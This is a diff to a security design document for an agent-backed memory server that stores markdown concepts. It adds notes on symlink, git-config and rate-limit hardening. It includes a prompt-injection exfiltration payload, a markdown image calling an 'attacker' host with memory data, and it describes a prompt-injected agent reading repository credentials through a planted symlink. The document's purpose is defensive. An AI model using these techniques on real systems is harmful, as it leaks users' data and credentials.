@@ -31,7 +31,9 @@ Untrusted input arrives in five ways:
   pass on a public bind (an address cannot be rebound), and any other hostname must be listed in
   `ALLOWED_HOSTS`.
 - **Bearer auth** (`AUTH_TOKEN`). Tokens are compared as SHA-256 digests with `timingSafeEqual`.
-  Failed attempts are throttled *before* the comparison: 20 per 15 minutes per client.
+  Failed attempts are throttled *before* the comparison: 20 per 15 minutes per client. A failure
+  is counted in the same synchronous step that detects it, so a burst of parallel guesses cannot
+  slip past the limit, and valid requests — however long they run — never count.
 - **Order matters** in `server/src/index.ts`: the network guard runs before auth, so a hostile
   origin is refused whether or not a token is set.
 - **Response hardening:**
@@ -47,6 +49,16 @@ Untrusted input arrives in five ways:
   additionally follow symlinks (`assertRealPathInside`, `resolveContained`).
 - **Walkers skip symlinks and dot-entries**, so host files never enter the tree, search, graph or
   index, and `.traces/` and `.git` stay invisible.
+- **The concept API stays out of hidden paths.** Reads, writes and deletes refuse any path with a
+  dot segment (`/.git/config`, `/.traces/…`) — as typed *and* after following symlinks — and
+  reads require `.md`, so a prompt-injected agent cannot read repository credentials or other
+  callers' traces through `read_concept`, not even via a planted `notes/x.md -> ../.git/config`.
+- **Writes cannot be redirected.** Temp files get random names and are created with `O_EXCL`, so a
+  symlink planted under a predictable temp name is never followed. Directories are created only
+  after the target's nearest existing ancestor is confirmed to be inside the bundle. `log.md` is
+  used only when it resolves to a file inside the bundle (a symlink is replaced, never written
+  through, by the atomic rename), and `.traces/` only when it is a real directory; a symlinked
+  `.traces` is ignored rather than written to or pruned.
 - **Frontmatter is YAML only.** Fences naming another language (`---js`) are refused, because
   general-purpose frontmatter parsers evaluate them as code. Parsing uses the YAML 1.2 core
   schema, and aliases are capped by the `yaml` library.
@@ -54,7 +66,9 @@ Untrusted input arrives in five ways:
   or `commit`, so every git call:
   - disables hooks, fsmonitor and commit signing;
   - is refused when the repository's own config sets any key that runs a command (filters, diff
-    drivers, aliases, `include.path`, …). This check fails closed;
+    drivers, aliases, `include.path`, …) or points git elsewhere (`core.worktree`). Every
+    repository-controlled scope is checked, including `.git/config.worktree`. The check fails
+    closed;
   - stages everything except `.traces/`, which holds users' prompts.
 
 ### Prompt injection
@@ -76,6 +90,9 @@ Untrusted input arrives in five ways:
 - Markdown is sanitized with `rehype-sanitize` (links: `http`, `https`, `mailto` only).
 - `dangerouslySetInnerHTML` is used only for Shiki's highlighted code, which escapes its input.
 - External links get `noopener noreferrer`.
+- **Images load only from the server itself** (CSP `img-src 'self' data:`). Model output is
+  rendered as markdown, and an injected `![](https://attacker/?data=…)` would otherwise send memory
+  contents away the moment it renders. The cost: external images in concepts don't display.
 - The access token is kept in `sessionStorage`, so it lives only as long as the tab.
 
 ### Cost and availability
@@ -93,11 +110,19 @@ Untrusted input arrives in five ways:
   | `memory_add` content | 100,000 characters |
   | `memory_update` instruction | 20,000 characters |
   | newest chat turn | 20,000 characters |
+  | whole chat conversation (re-sent with every turn) | 200,000 characters |
+  | concept body returned by `read_concept` | 20,000 characters |
   | JSON body | 1 MB |
+
+  Chat requests may only carry `user` and `assistant` messages.
 
 - Clients cannot choose a model unless it is listed in `ALLOWED_MODELS`.
 - Agent runs have a step cap (`LLM_MAX_STEPS`) and a time limit (`LLM_TIMEOUT`), and stop when
-  the chat client disconnects.
+  the chat or MCP client disconnects or cancels.
+- Durations are capped at what a timer can hold (about 24.8 days); larger values would make
+  timers fire at once — e.g. a dream on every millisecond.
+- Dreaming runs only when its signals changed since the last dream: at least five new log
+  entries, or orphans, broken links, duplicates or oversized concepts it hasn't acted on yet.
 - Link extraction runs in linear time, even on hostile input.
 
 ### Secrets
@@ -145,5 +170,10 @@ Untrusted input arrives in five ways:
   snapshot would remove the rest of that cost.
 - **`HOT_MEMORY_RECALL_QA` defaults to on**, which suits a single user. Turning it off by default
   would be a product decision.
+- **Two check-then-act windows.** Between the symlink check and the write of a concept, and
+  between the git config check and `add`/`commit`, a process that rewrites the bundle at the same
+  moment could swap in a symlink or config. Exploiting that needs control of a concurrent writer
+  (e.g. a sync daemon) and precise timing; closing it fully would need file-descriptor-relative
+  I/O that Node does not offer.
 - **The mutation queue is per process.** An stdio client and the HTTP server pointed at the same
   bundle are not serialized against each other.
